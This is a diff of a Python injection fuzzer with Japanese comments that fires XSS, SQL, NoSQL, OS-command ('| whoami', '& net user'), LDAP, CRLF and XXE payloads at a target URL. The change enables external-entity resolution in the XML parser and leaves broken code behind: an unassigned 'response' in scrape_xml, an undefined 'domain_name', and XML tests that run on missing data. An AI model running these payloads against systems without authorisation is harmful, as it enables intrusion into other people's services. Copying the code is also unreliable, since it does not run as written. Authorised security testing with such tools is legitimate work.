@@ -1,12 +1,8 @@
 import requests
 import json
-import csv
-import yaml
 import sys
-from bs4 import BeautifulSoup
 from ldap3 import Server, Connection, ALL
 from lxml import etree
-from typing import List, Dict, Union
 
 # テスト用ペイロードの定義
 XSS_PAYLOADS = [
@@ -40,16 +36,6 @@ OS_COMMAND_PAYLOADS = [
     "| whoami",
     "& net user"
     ]
-
-# NoSQLインジェクション用のペイロード
-NOSQL_PAYLOADS = [
-    "{ '$ne': null }",
-    "{ '$gt': '' }",
-    "{ '$lt': '' }",
-    "{ '$regex': '.*' }",
-    "' OR 1=1",
-    "\" OR 1=1"
-]
 NO_SQL_PAYLOADS = [
     '{ "username": { "$ne": "" } }',
     '{ "username": "admin", "password": { "$ne": "" } }',
@@ -121,120 +107,28 @@ XXE_PAYLOAD = """
 ]>
 <foo>&xxe;</foo>
 """
-# 汎用ペイロード
-GENERIC_PAYLOADS = [
-    "../../../../etc/passwd",
-    "<svg onload=alert('XSS')>",
-    "test<script>alert(1)</script>",
-    "' UNION SELECT 1,2,3--"
-]
 
-# ペイロードを結合
-ALL_PAYLOADS = XSS_PAYLOADS + SQL_PAYLOADS + NOSQL_PAYLOADS + GENERIC_PAYLOADS
+# ファジング関数 
+def fuzz(url, params=None, payloads=None):
+    if payloads is None:
+        payloads = XSS_PAYLOADS + SQL_PAYLOADS + OS_COMMAND_PAYLOADS
 
+    #比較用のレスポンステキスト
+    response = requests.get(url)
+    result = response.text
 
-def send_request(url: str, method: str, params: Dict, data: Dict) -> requests.Response:
-    """
-    HTTPリクエストを送信
-    :param url: ターゲットURL
-    :param method: HTTPメソッド (GET, POST, etc.)
-    :param params: クエリパラメータ
-    :param data: POSTデータ
-    :return: リクエストのレスポンスオブジェクト
-    """
-    try:
-        if method == 'GET':
-            return requests.get(url, params=params)
-        elif method == 'POST':
-            return requests.post(url, data=data)
-        else:
-            raise ValueError(f"Unsupported HTTP method: {method}")
-    except requests.RequestException as e:
-        raise RuntimeError(f"Request failed: {e}")
-
-
-def analyze_response(response: requests.Response, payload: str):
-    """
-    レスポンスを解析して脆弱性を検出
-    :param response: HTTPレスポンスオブジェクト
-    :param payload: 使用したペイロード
-    """
-    try:
-        if response.status_code == 200 and payload in response.text:
-            print(f"[+] Vulnerability detected with payload: {payload}")
-        else:
-            print(f"[-] No vulnerability found for payload: {payload}")
-    except Exception as e:
-        print(f"[!] Error analyzing response for payload {payload}: {e}")
-
-
-def load_target_list(filename: str) -> Union[List[Dict], str]:
-    """
-    検索リストをさまざまな形式から読み込む
-    :param filename: ファイル名（JSON, CSV, YAML, HTML をサポート）
-    :return: ターゲットリストまたはHTML文字列
-    """
-    try:
-        # ファイル拡張子に基づいて処理を分ける
-        if filename.endswith('.json'):
-            with open(filename, 'r', encoding='utf-8') as file:
-                return json.load(file)
-
-        elif filename.endswith('.csv'):
-            with open(filename, 'r', encoding='utf-8') as file:
-                reader = csv.DictReader(file)
-                return [row for row in reader]
-
-        elif filename.endswith(('.yaml', '.yml')):
-            with open(filename, 'r', encoding='utf-8') as file:
-                return yaml.safe_load(file)
-
-        elif filename.endswith('.html'):
-            with open(filename, 'r', encoding='utf-8') as file:
-                soup = BeautifulSoup(file, 'html.parser')
-                return soup.prettify()
-
-        else:
-            raise ValueError(f"Unsupported file format for: {filename}")
-
-    except Exception as e:
-        print(f"Error loading target list: {e}")
-        return []
-
-def fuzz_target_list(target_list: List[Dict], payloads: List[str]):
-    """
-    検索リストを対象にインジェクションテストを実行
-    :param target_list: [{'url': '...', 'params': {'q': 'test'}, 'method': 'GET'}, ...]
-    :param payloads: ペイロードのリスト
-    """
-    for target in target_list:
-        url = target.get('url')
-        method = target.get('method', 'GET').upper()
-        params = target.get('params', {})
-        data = target.get('data', {})
-        
-        # URLが存在しない場合のチェック
-        if not url:
-            print(f"[!] Skipping target due to missing URL: {target}")
-            continue
-
-        print(f"\nTesting URL: {url} with method: {method}")
-        
-        for payload in payloads:
-            # テスト用のパラメータとデータを構築
-            test_params = {k: payload for k in params}
-            test_data = {k: payload for k in data}
+    for payload in payloads:
+        test_params = {key: payload for key in (params or {})}
+        try:
+            response_parttern = requests.get(url, params=test_params)
             
-            try:
-                # リクエストの実行
-                response = send_request(url, method, test_params, test_data)
-                
-                # レスポンスの解析
-                analyze_response(response, payload)
-            except Exception as e:
-                print(f"[!] Error during testing with payload {payload}: {e}")
-
-
+            if response_parttern.status_code != response.status_code or response_parttern.text != result:
+                print(f'Found Injection')
+                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
+            else:
+                print(f'Not Found | {payload}')
+        except Exception as e:
+            print(f"Error with payload {payload}: {e}") 
 
 
 # NoSQLインジェクション
@@ -399,7 +293,6 @@ def test_unicode_injection(url, param):
 #xmlファイルのスクレイピング
 def scrape_xml(target_url):
     try:
-        response = requests.get(target_url)
         if response.headers.get("Content-Type") == "application/xml" or ".xml" in target_url:
             #要素を取得
             xml_content =response.content
@@ -462,9 +355,10 @@ def test_xxe(xml_data):
 
     :param xml_payload: 攻撃を含むXMLデータ
     """
+    print("=== Testing XXE Payload ===")
     try:
         # XXE脆弱性があるパーサー
-        parser = etree.XMLParser(resolve_entities=false)  # 外部エンティティを解決する設定　取り扱い注意！
+        parser = etree.XMLParser(resolve_entities=True)  # 外部エンティティを解決する設定　取り扱い注意！
 
         # XMLをパース
         doc = etree.fromstring(xml_data, parser)
@@ -479,65 +373,53 @@ if __name__ == "__main__":
         print("Usage: python fuzzing.py <URL>")
         sys.exit(1)
 
-    target_file = sys.argv[1]
-    targets = load_target_list(target_file)
-
-    if not targets:
-        print("No targets loaded. Exiting.")
-        sys.exit(1)
-        
-    print(f"Loaded {len(targets)} targets.")
+    target_url = sys.argv[1]
+    print(f"Target URL: {target_url}")
     
     print("=== XSS SQL OS Injection Test === ")
     
-    print("\n=== Fuzzing Targets ===")
-    fuzz_target_list(targets, ALL_PAYLOADS)
+    print("=== Fuzzing ===")
+    fuzz(target_url, params={"username": "test", "password":"password", "q": "test"})
 
     print('=== NoSQL Injection Test') 
-    test_nosql_injection(target_file)
+    test_nosql_injection(target_url)
 
     print("=== CSTI Test ===")
-    test_csti(target_file)
+    test_csti(target_url)
 
     print("=== HTTP Header Injection Test")
     headers = {"User-Agent": "test"}  
-    test_header_injection(target_file, headers)
+    test_header_injection(target_url, headers)
     
     print("=== LDAP Injection ===") 
-    if "ldap://" in target_file:
+    if "ldap://" in target_url:
         print("contain 'ldap://' ")  
-        domain, extension = split_domain(target_url.replace("ldap://", "").split("/")[0])
+        domain, extension = split_domain(domain_name)
         base_dn = f"dc={domain},dc={extension}"
-        test_ldap_injection(target_file, base_dn)
+        test_ldap_injection(target_url, base_dn)
     else:
-        print("This url do not contain 'ldap//'")
+        print("This url do not contain ldap")
     
     print("=== JSON Injecion Test")
     base_data = {
         "username": "test",
         "role": "user"
     }
-    test_json_injection(target_file, base_data)
+    test_json_injection(target_url, base_data)
 
     print("=== CSLF Injection Test ===")
-    test_crlf_injection(target_file, "query")
+    test_crlf_injection(target_url, "query")
 
     print("=== Unicode Injection Test ===")
-    test_unicode_injection(target_file, "username") 
+    test_unicode_injection(target_url, "username") 
     
     print("Scan XML file......")
-    xml_data = scrape_xml(target_file)
+    xml_data = scrape_xml(target_url)
     print("=== XPath Injection Test ===") 
-    if xml_data:
-        test_xpath_injection(xml_data)
-    else:
-        print("No XML data found for XPath testing.")
+    test_xpath_injection(xml_data)
 
     print("===XSLT Injection Test ===") 
-    if xml_data:
-        test_xslt_injection(xml_data)
-    else:
-        print("No XML data found for XSLT testing.")
+    test_xslt_injection(xml_data)
 
     print("===XXE Test ===") 
     test_xxe(xml_data)
